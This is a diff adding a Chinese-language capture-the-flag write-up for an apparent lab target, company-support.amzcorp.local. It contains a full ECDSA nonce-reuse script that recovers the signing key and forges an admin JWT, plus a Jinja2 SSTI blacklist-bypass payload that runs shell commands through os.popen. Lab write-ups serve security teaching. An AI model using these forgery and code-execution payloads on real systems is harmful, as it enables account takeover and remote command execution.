@@ -1356,3 +1356,669 @@ AWS{MySqL_T1m3_B453d_1nJ3c71on5_4_7h3_w1N}
 ```
 
 ## Relentless
+
+对先前获取的数据进行分析，在解析的域名中，可以看到
+
+```plaintext
+company-support.amzcorp.local
+```
+
+加入 hosts 记录之后进行访问
+
+![img](img/image_20260407-200707.png)
+
+同样地，创建一个 `aa123:aa123@example.com:aa123` 测试账户之后，尝试登录
+
+![img](img/image_20260408-200834.png)
+
+根据先前的题目，先爆破一下目录看看
+
+```shell title="dirsearch -u http://company-support.amzcorp.local"
+[20:11:31] 404 -  196B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
+[20:11:44] 404 -  196B  - /a%5c.aspx
+[20:16:35] 200 -    8KB - /login
+[20:18:01] 200 -    8KB - /register
+```
+
+换个思路，抓包看登录时的请求
+
+```plaintext
+HTTP/1.1 302 FOUND
+Date: Wed, 08 Apr 2026 12:23:22 GMT
+Server: gunicorn
+Content-Type: text/html; charset=utf-8
+Content-Length: 208
+Location: http://company-support.amzcorp.local/
+Vary: Cookie
+Set-Cookie: aws_auth=eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6ImFhMTIzIiwiZW1haWwiOiJhYTEyM0BleGFtcGxlLmNvbSIsImFjY291bnRfc3RhdHVzIjpmYWxzZX0.Zpl1DsWOF3Z_LJZ9yvKo2Xju32ZfXj5WvVSZoqYzbes2qZzU8GhvBmJ7jJfqDPtXzR4pK-0z4_bXRn7y8Et4Yg; Path=/
+Set-Cookie: session=.eJwljktqA0EMBe_S6yykUbc-vszQrQ82gQRm7FXI3TMmy3rUg_ppex153tvtebzyo-2PaLfmm2qm0CJa3FfOIiFloFrlwOglHhxBEFm5VrGzh0PHydlFqEap4PX0Usfx9oeDhKcYsswMSewdVdhtUsDoDoaYgUYM7Qp5nXn816Be7OdR-_P7M7_ei43Bc6wZaZ680QQTARoYtvW-heoqU2q_fy62QIs.adZIug.PPJ8hIgMIZN-lznjYrk-cPiTx6E; HttpOnly; Path=/
+Keep-Alive: timeout=5, max=92
+Connection: Keep-Alive
+```
+
+尝试分析 `aws_auth`
+
+![img](img/image_20260425-202533.png)
+
+尝试使用之前获取的 `tyler@amzcorp.local : {pXDWXyZ&>3h''W<` 凭据进行登录，但是提示凭据无效
+
+根据判断，这个网站还是使用了先前从 `jobs-development` 泄露的那套源码
+
+查看登录部分的源码
+
+```python
+@blueprint.route('/login', methods=['GET', 'POST'])
+def login():
+    login_form = LoginForm(request.form)
+    if 'login' in request.form:
+
+        # read form data
+        username = request.form['username']
+        password = request.form['password']
+
+        # Locate user
+        user = Users.query.filter_by(username=username).first()
+
+        # Check the password
+        if user and verify_pass(password, user.password):
+            data = {"username":user.username, "email":user.email, "account_status":user.account_status}
+            jwt = create_jwt(data)
+            login_user(user)
+            resp = make_response(redirect(url_for('authentication_blueprint.route_default')))
+            resp.set_cookie('aws_auth', jwt)
+            return resp
+
+        # Something (user or pass) is not ok
+        return render_template('accounts/login.html',
+                               msg='Wrong user or password',
+                               form=login_form)
+
+    if not current_user.is_authenticated:
+        return render_template('accounts/login.html',
+                               form=login_form)
+    data = decode_jwt(request.cookies.get('aws_auth'))
+    get_user = Users.query.filter_by(username=data['username']).first()
+    if get_user.role == "Administrators":
+        return redirect(url_for('home_blueprint.dashboard'))
+    else:
+        return redirect(url_for('home_blueprint.user_dashboard'))
+```
+
+查看 JWT 部分的实现
+
+```python
+from ecdsa.ecdsa import curve_256, generator_256, Public_key, Private_key, Signature
+
+
+def create_jwt(data):
+    header = {"alg": "ES256"}
+    _header = b64(json.dumps(header, separators=(',', ':')).encode())
+    _data = b64(json.dumps(data, separators=(',', ':')).encode())
+    _sig = sign(f"{_header}.{_data}".replace("=", ""))
+    jwt = f"{_header}.{_data}.{_sig}"
+    jwt = jwt.replace("=", "")
+    return jwt
+```
+
+先查看为什么会登录失败，猜测账户首先需要激活，定位到账户激活的路由
+
+```python
+@blueprint.route('/confirm_account/<secretstring>', methods=['GET', 'POST'])
+def confirm_account(secretstring):
+    s = URLSafeSerializer('serliaizer_code')
+    username, email = s.loads(secretstring)
+
+    user = Users.query.filter_by(username=username).first()
+    user.account_status = True
+    db.session.add(user)
+    db.session.commit()
+
+    #return redirect(url_for("authentication_blueprint.login", msg="Your account was confirmed succsessfully"))
+    return render_template('accounts/login.html',
+                        msg='Account confirmed successfully.',
+                        form=LoginForm())
+```
+
+那么就需要构造一个激活账户的数据包
+
+```python
+import requests
+import urllib3
+import json
+import base64
+
+# 禁用 InsecureRequestWarning 警告
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+from itsdangerous import URLSafeSerializer
+
+# 设置 SOCKS5 代理
+proxies = {
+    "http": "socks5://127.0.0.1:1080",
+    "https": "socks5://127.0.0.1:1080",
+}
+
+
+target = f"http://company-support.amzcorp.local/confirm_account/"
+
+secretstring = URLSafeSerializer("serliaizer_code").dumps(["aa123", "aa123@example.com"])
+
+print(target + secretstring)
+# http://company-support.amzcorp.local/confirm_account/WyJhYTEyMyIsImFhMTIzQGV4YW1wbGUuY29tIl0.LJmJIkT1K-iNdssS4JePP1uQxZU
+```
+
+成功激活账户
+
+![img](img/image_20260418-211852.png)
+
+随后成功登录了系统
+
+![img](img/image_20260419-211924.png)
+
+注意到这句话
+
+```plaintext
+tony will be handling your requests today
+```
+
+那么也就意味着，需要伪造成 `tony` 的身份进入系统
+
+对源码中的 `jobs-development/support_portal/apps/authentication/custom_jwt.py` 进行分析后，发现核心问题
+
+```python
+# L 11-12
+k = randint(1, q - 1)
+d = randint(1, q - 1)
+```
+
+意味着全局的 JWT 的 k 值都是一样的，存在有 ECDSA 签名中的 Nonce 重用攻击
+
+首先需要两个不同用户的 JWT 数据
+
+```plaintext
+User: aa123:aa123@example.com:aa123
+JWT:  eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6ImFhMTIzIiwiZW1haWwiOiJhYTEyM0BleGFtcGxlLmNvbSIsImFjY291bnRfc3RhdHVzIjpmYWxzZX0.Zpl1DsWOF3Z_LJZ9yvKo2Xju32ZfXj5WvVSZoqYzbes2qZzU8GhvBmJ7jJfqDPtXzR4pK-0z4_bXRn7y8Et4Yg
+
+User: bb123:bb123@example.com:bb123
+JWT:  eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6ImJiMTIzIiwiZW1haWwiOiJiYjEyM0BleGFtcGxlLmNvbSIsImFjY291bnRfc3RhdHVzIjpmYWxzZX0.q7kErmg406LeCRy6wo7IsbrjdaC_kkMQwmtS_RcI_awLlnm5W-tZyGtxOAuh26-Mpr4eOYbt1WWxbGs7yiLqXw
+```
+
+从网上掏一份分析脚本来进行攻击
+
+```python title="generateJWTTony.py"
+#!/usr/bin/env python3
+"""
+CTF漏洞利用 - 利用重用 Nonce (k) 的 ECDSA 漏洞
+自动提取密钥并生成伪造的JWT
+"""
+
+import base64
+import json
+import hashlib
+import sys
+from ecdsa.ecdsa import generator_256, Public_key, Private_key, Signature
+from Crypto.Util.number import bytes_to_long, long_to_bytes
+import libnum
+
+# ============================================================================
+# 辅助功能
+# ============================================================================
+
+
+def b64(data):
+    """Base64 URL-safe 编码"""
+    return base64.urlsafe_b64encode(data).decode()
+
+
+def unb64(data):
+    """Base64 URL-safe 解码，带填充"""
+    l = len(data) % 4
+    return base64.urlsafe_b64decode(data + "=" * (4 - l))
+
+
+def print_step(step_num, title):
+    """清晰地打印步骤信息"""
+    print(f"\n{'='*60}")
+    print(f"步骤 {step_num}: {title}")
+    print(f"{'='*60}")
+
+
+# ============================================================================
+# JWT 1: User 1 的 JWT + User 2 的 JWT
+# ============================================================================
+
+print_step(1, "TOKENS INICIALES")
+print("提供的令牌用于分析:")
+
+jwt1 = "eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6ImFhMTIzIiwiZW1haWwiOiJhYTEyM0BleGFtcGxlLmNvbSIsImFjY291bnRfc3RhdHVzIjp0cnVlfQ.q7kErmg406LeCRy6wo7IsbrjdaC_kkMQwmtS_RcI_az794wu9RPEpEz5K3WGKpyjnnDgiEvMmXhJPIJExDD0WQ"
+jwt2 = "eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6ImJiMTIzIiwiZW1haWwiOiJiYjEyM0BleGFtcGxlLmNvbSIsImFjY291bnRfc3RhdHVzIjpmYWxzZX0.q7kErmg406LeCRy6wo7IsbrjdaC_kkMQwmtS_RcI_awLlnm5W-tZyGtxOAuh26-Mpr4eOYbt1WWxbGs7yiLqXw"
+
+print()
+print(f"JWT 1: {jwt1[:50]}...\nJWT 2: {jwt2[:50]}...")
+
+# 解码以查看内容
+print("\n解码后的内容:")
+print("-" * 40)
+
+
+def decode_jwt_simple(jwt):
+    """解码 JWT 以显示其内容"""
+    parts = jwt.split(".")
+    try:
+        header = json.loads(unb64(parts[0]))
+        data = json.loads(unb64(parts[1]))
+        return header, data
+    except:
+        return {}, {}
+
+
+header1, data1 = decode_jwt_simple(jwt1)
+header2, data2 = decode_jwt_simple(jwt2)
+
+print(f"JWT1 - Header: {header1}")
+print(f"JWT1 - Data:   {data1}")
+print()
+print(f"JWT2 - Header: {header2}")
+print(f"JWT2 - Data:   {data2}")
+
+# ============================================================================
+# PASO 2: 检查漏洞(重用 k)
+# ============================================================================
+
+print_step(2, "检测漏洞")
+
+
+def get_r_from_jwt(jwt):
+    """提取 ECDSA 签名的 'r' 组件"""
+    parts = jwt.split(".")
+    sig_encoded = parts[2]
+    sig_bytes = unb64(sig_encoded)
+    sig_int = bytes_to_long(sig_bytes)
+    r = sig_int >> 256  # 提取 r(前 256 位)
+    return r
+
+
+r1 = get_r_from_jwt(jwt1)
+r2 = get_r_from_jwt(jwt2)
+
+print(f"r1 (de JWT1) = {r1}")
+print(f"r2 (de JWT2) = {r2}")
+print()
+
+if r1 == r2:
+    print("✅ 漏洞存在！在两次签名中重用了 nonce 'k'。")
+    print(f"   重用的值: r = {r1}")
+else:
+    print("❌ 未检测到 k 的重用")
+    sys.exit(1)
+
+# ============================================================================
+# PASO 3: 提取签名组件
+# ============================================================================
+
+print_step(3, "提取签名组件")
+
+# 分离两个 JWT 的组件
+head1, data1, sig1_encoded = jwt1.split(".")
+head2, data2, sig2_encoded = jwt2.split(".")
+
+# 计算签名消息的哈希
+msg1 = f"{head1}.{data1}"
+msg2 = f"{head2}.{data2}"
+
+h1 = bytes_to_long(hashlib.sha256(msg1.encode()).digest())
+h2 = bytes_to_long(hashlib.sha256(msg2.encode()).digest())
+
+print(f"消息 1 的哈希 (h1): {h1}")
+print(f"消息 2 的哈希 (h2): {h2}")
+
+# 解码签名
+sig1_bytes = unb64(sig1_encoded)
+sig2_bytes = unb64(sig2_encoded)
+
+sig1_int = bytes_to_long(sig1_bytes)
+sig2_int = bytes_to_long(sig2_bytes)
+
+# 创建 Signature 对象
+sig1 = Signature(sig1_int >> 256, sig1_int % (2**256))
+sig2 = Signature(sig2_int >> 256, sig2_int % (2**256))
+
+r1, s1 = sig1.r, sig1.s
+r2, s2 = sig2.r, sig2.s
+
+print(f"\n签名 1: r={r1}, s={s1}")
+print(f"签名 2: r={r2}, s={s2}")
+
+if r1 != r2:
+    print("❌ 错误: 在重用 k 的情况下，r 值应该相等")
+    sys.exit(1)
+
+# ============================================================================
+# PASO 4: Calcular clave privada (d) y nonce (k)
+# ============================================================================
+
+print_step(4, "计算私钥 (d) 和 nonce (k)")
+
+G = generator_256
+q = G.order()
+
+print(f"群的阶 (q): {q}")
+
+# 使用公式计算 k: k = (h1 - h2) / (s1 - s2) mod q
+s_diff = (s1 - s2) % q
+h_diff = (h1 - h2) % q
+
+s_diff_inv = libnum.invmod(s_diff, q)
+k = (h_diff * s_diff_inv) % q
+
+print(f"计算出的 nonce k: {k}")
+
+# 使用公式计算 d: d = (s1*k - h1) / r mod q
+# 或使用更稳定的形式: d = ((s2*h1 - s1*h2) / (r*(s1-s2))) mod q
+valinv = libnum.invmod(r1 * (s1 - s2), q)
+d = (((s2 * h1) - (s1 * h2)) * valinv) % q
+
+print(f"计算出的私钥 d: {d}")
+
+# 验证密钥是否正确
+pubkey = Public_key(G, G * d)
+privkey = Private_key(pubkey, d)
+
+print("\n✅ 密钥计算正确")
+
+# ============================================================================
+# PASO 5: 为用户 tony 生成 JWT
+# ============================================================================
+
+print_step(5, "生成伪造的 JWT")
+
+
+def sign_with_keys(msg, privkey, k_value):
+    """使用提取的密钥签名消息"""
+    msghash = hashlib.sha256(msg.encode()).digest()
+    sig = privkey.sign(bytes_to_long(msghash), k_value)
+    _sig = (sig.r << 256) + sig.s
+    return b64(long_to_bytes(_sig)).replace("=", "")
+
+
+def create_jwt(data):
+    """使用提取的密钥创建有效的 JWT"""
+    header = {"alg": "ES256"}
+    _header = b64(json.dumps(header, separators=(",", ":")).encode())
+    _data = b64(json.dumps(data, separators=(",", ":")).encode())
+
+    # 使用重用的 k
+    _sig = sign_with_keys(f"{_header}.{_data}".replace("=", ""), privkey, k)
+
+    jwt = f"{_header}.{_data}.{_sig}"
+    jwt = jwt.replace("=", "")
+    return jwt
+
+
+# 目标数据 para 用户 'tony'
+target_data = {"username": "tony", "email": "tony@amzcorp.local", "account_status": True}
+
+print(f"目标数据: {target_data}")
+
+# 生成伪造的 JWT
+tony_jwt = create_jwt(target_data)
+
+print(f"\n🔑 JWT GENERADO PARA TONY:")
+print(f"{tony_jwt}")
+
+# ============================================================================
+# PASO 6: 验证(可选)
+# ============================================================================
+
+print_step(6, "验证生成的 JWT")
+
+
+# 验证生成的 JWT 是否有效
+def verify_jwt(jwt, pubkey):
+    """使用公钥验证 JWT"""
+    _header, _data, _sig = jwt.split(".")
+    sig_bytes = unb64(_sig)
+    sig_int = bytes_to_long(sig_bytes)
+    signature = Signature(sig_int >> 256, sig_int % 2**256)
+    msghash = bytes_to_long(hashlib.sha256((f"{_header}.{_data}").encode()).digest())
+    return pubkey.verifies(msghash, signature)
+
+
+if verify_jwt(tony_jwt, pubkey):
+    print("✅ 生成的 JWT 通过了公钥验证。")
+else:
+    print("❌ 生成的 JWT 未通过公钥验证。")
+
+# ============================================================================
+# 最终说明
+# ============================================================================
+
+# 解码生成的 JWT 以进行验证
+print("\n生成的 JWT 内容: ")
+print("-" * 40)
+header_gen, data_gen = decode_jwt_simple(tony_jwt)
+print(f"Header: {header_gen}")
+print(f"Data:   {data_gen}")
+```
+
+运行脚本，得到
+
+```plaintext
+============================================================
+步骤 1: TOKENS INICIALES
+============================================================
+提供的令牌用于分析:
+
+JWT 1: eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6ImFhMTIzIiwiZ...
+JWT 2: eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6ImJiMTIzIiwiZ...
+
+解码后的内容:
+----------------------------------------
+JWT1 - Header: {'alg': 'ES256'}
+JWT1 - Data:   {'username': 'aa123', 'email': 'aa123@example.com', 'account_status': True}
+
+JWT2 - Header: {'alg': 'ES256'}
+JWT2 - Data:   {'username': 'bb123', 'email': 'bb123@example.com', 'account_status': False}
+
+============================================================
+步骤 2: 检测漏洞
+============================================================
+r1 (de JWT1) = 77672396123714516242872376460898726283991799659196338290051384642168227954092
+r2 (de JWT2) = 77672396123714516242872376460898726283991799659196338290051384642168227954092
+
+✅ 漏洞存在！在两次签名中重用了 nonce 'k'。
+   重用的值: r = 77672396123714516242872376460898726283991799659196338290051384642168227954092
+
+============================================================
+步骤 3: 提取签名组件
+============================================================
+消息 1 的哈希 (h1): 112382161827902582269592250810701346786524581091631719138118574450808237142345
+消息 2 的哈希 (h2): 94025149668394990235341565441336049156978753504873244220252912088282953585597
+
+签名 1: r=77672396123714516242872376460898726283991799659196338290051384642168227954092, s=113967903729855865375603636245643006785841400386077761377893281346982956299353
+签名 2: r=77672396123714516242872376460898726283991799659196338290051384642168227954092, s=5241308502711019212752789562826248418977233331586957158310268081580814821983
+
+============================================================
+步骤 4: 计算私钥 (d) 和 nonce (k)
+============================================================
+群的阶 (q): 115792089210356248762697446949407573529996955224135760342422259061068512044369
+计算出的 nonce k: 5651261823506587827207238719854018636750094446965443187104255366069863738104
+计算出的私钥 d: 109326595970662601154659996775889069481335969867900505825042392463915464958440
+
+✅ 密钥计算正确
+
+============================================================
+步骤 5: 生成伪造的 JWT
+============================================================
+目标数据: {'username': 'tony', 'email': 'tony@amzcorp.local', 'account_status': True}
+
+🔑 JWT GENERADO PARA TONY:
+eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InRvbnkiLCJlbWFpbCI6InRvbnlAYW16Y29ycC5sb2NhbCIsImFjY291bnRfc3RhdHVzIjp0cnVlfQ.q7kErmg406LeCRy6wo7IsbrjdaC_kkMQwmtS_RcI_az7iOLOwny8jntIc3JUSn_Nqfg6nTTq5FKA07tr8aYPRA
+
+============================================================
+步骤 6: 验证生成的 JWT
+============================================================
+✅ 生成的 JWT 通过了公钥验证。
+
+生成的 JWT 内容:
+----------------------------------------
+Header: {'alg': 'ES256'}
+Data:   {'username': 'tony', 'email': 'tony@amzcorp.local', 'account_status': True}
+```
+
+在浏览器中，替换掉原先的 Cookie 之后，访问 `http://company-support.amzcorp.local/admin/tickets`
+
+![img](img/image_20260458-205848.png)
+
+页面中残留了很多 SSTI Payload 记录
+
+尝试新增一个 ticket 记录，测试一下 SSTI 攻击的可行性
+
+首先需要定位增加 ticket 的路由实现
+
+```python
+@blueprint.route('/users/tickets/create', methods=['POST'])
+@login_required
+def user_create_ticket():
+    if request.form.get('title') and request.form.get('message'):
+        data = decode_jwt(request.cookies.get('aws_auth'))
+        if verify(request.cookies.get('aws_auth')):
+            if data['account_status'] == 1:
+                title = request.form.get('title')
+                if title == "":
+                    title_error = True
+                    return redirect(url_for('home_blueprint.user_dashboard',title_error=title_error))
+                message = request.form.get('message')
+                if message == "":
+                    message_error = True
+                    return redirect(url_for('home_blueprint.user_dashboard',message_error=message_error))
+                user_sent = data['username']
+                status = "Unread"
+                ticket = Tickets(**request.form)
+                ticket.status = status
+                ticket.user_sent = user_sent
+                db.session.add(ticket)
+                db.session.commit()
+                successfully_submitted = True
+                return redirect(url_for('home_blueprint.user_dashboard', successfully_submitted=successfully_submitted))
+            else:
+                return redirect(url_for('home_blueprint.inactive_account'))
+        else:
+            return render_template('home/403.html')
+    else:
+        missing_title_or_message = True
+        return redirect(url_for('home_blueprint.user_dashboard',missing_title_or_message=missing_title_or_message))
+```
+
+知道路由的具体实现之后，编写请求包
+
+```plaintext
+POST /users/tickets/create HTTP/1.1
+Host: company-support.amzcorp.local
+Accept-Language: zh-CN,zh;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Cookie: session=.eJwljklqAzEQAP-isw-9Sd3yZwZNLyQYEpixT8Z_z0CoU9Wp3m2rI8-vdn8er7y17TvavfWyWQxrR1fXmCzeAT1ZVTTKmKSo0jAnINIyMCHqvEBizcrCFTgYYY8eMsN50Ui0qtW1CvWCFGwm0c4ATmUKQWzuMWm0a-R15vF_g3a5n0dtz99H_lxFBGbUrJ4myzhGjE6yRs7Uzmw1gGywt88f1cA-dA.adelPQ.UtyC7zaJj7X1LL0s4IiAiBp2gQQ; aws_auth=eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InRvbnkiLCJlbWFpbCI6InRvbnlAYW16Y29ycC5sb2NhbCIsImFjY291bnRfc3RhdHVzIjp0cnVlfQ.q7kErmg406LeCRy6wo7IsbrjdaC_kkMQwmtS_RcI_az7iOLOwny8jntIc3JUSn_Nqfg6nTTq5FKA07tr8aYPRA
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 23
+
+title=1&message={{7*7}}
+```
+
+成功在 ticket 页面中得到 `49` 的执行结果
+
+注意到渲染模板的时候，存在有黑名单机制
+
+```python
+@blueprint.route('/admin/tickets/view/<id>', methods=['GET'])
+@login_required
+def view_ticket(id):
+    data = decode_jwt(request.cookies.get('aws_auth'))
+    if verify(request.cookies.get('aws_auth')):
+        user_authed = Users.query.filter_by(username=data['username']).first()
+        if user_authed.role == "Administrators":
+            ticket = Tickets.query.filter_by(id=id).first()
+            ticket.status = "Read"
+            db.session.commit()
+            message = ticket.message
+            user = Users.query.filter_by(username=ticket.user_sent).first()
+            email = user.email
+            blacklist = ["__classes__","request[request.","__","file","write"]
+            for bad_string in blacklist:
+                if bad_string in message:
+                    return render_template('home/500.html')
+            for bad_string in blacklist:
+                if bad_string in email:
+                    return render_template('home/500.html')
+            for bad_string in blacklist:
+                for param in request.args:
+                    if bad_string in request.args[param]:
+                        return render_template('home/500.html')
+            rendered_template = render_template("home/ticket.html", ticket=ticket,segment="tickets", email=email)
+            return render_template_string(rendered_template)
+        else:
+            return render_template('home/403.html')
+    else:
+        return render_template('home/403.html')
+```
+
+首先是
+
+```python
+{% for x in dict.mro()[-1]|attr(request.args.u~request.args.u~request.args.s~request.args.u~request.args.u)() %}{% if request.args.w in x|string %}{{loop.index0}}~{{x}}{%endif%}{% endfor %}
+```
+
+请求结果
+
+```plaintext
+http://company-support.amzcorp.local/admin/tickets/view/9?u=_&s=subclasses&w=wrap_close
+
+133~<class 'os._wrap_close'>
+```
+
+确定 index 为 `133` 之后
+
+接下来
+
+```python
+{% set sc=dict.mro()[-1]|attr(request.args.u~request.args.u~request.args.s~request.args.u~request.args.u)() %}{{sc|length}}
+```
+
+请求结果
+
+```plaintext
+http://company-support.amzcorp.local/admin/tickets/view/9?u=_&s=subclasses
+
+987
+```
+
+最终
+
+```plaintext
+{% set sc=dict.mro()[-1]|attr(request.args.u~request.args.u~request.args.s~request.args.u~request.args.u)() %}{% set cl=sc[133] %}{% set ini=cl[request.args.u~request.args.u~request.args.i~request.args.u~request.args.u] %}{% set gb=ini[request.args.u~request.args.u~request.args.g~request.args.u~request.args.u] %}{{gb[request.args.p](request.args.c)[request.args.r]()}}
+```
+
+进行利用
+
+```shell
+http://company-support.amzcorp.local/admin/tickets/view/9?u=_&s=subclasses&i=init&g=globals&p=popen&r=read&c=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+## flag - 04
+
+```plaintext
+http://company-support.amzcorp.local/admin/tickets/view/9?u=_&s=subclasses&i=init&g=globals&p=popen&r=read&c=cat%20../flag.txt
+
+AWS{N0nc3_R3u5e_t0_s571_c0de_ex3cu71on}
+```
+
+```plaintext title="Flag"
+AWS{N0nc3_R3u5e_t0_s571_c0de_ex3cu71on}
+```
+
+## Magnified
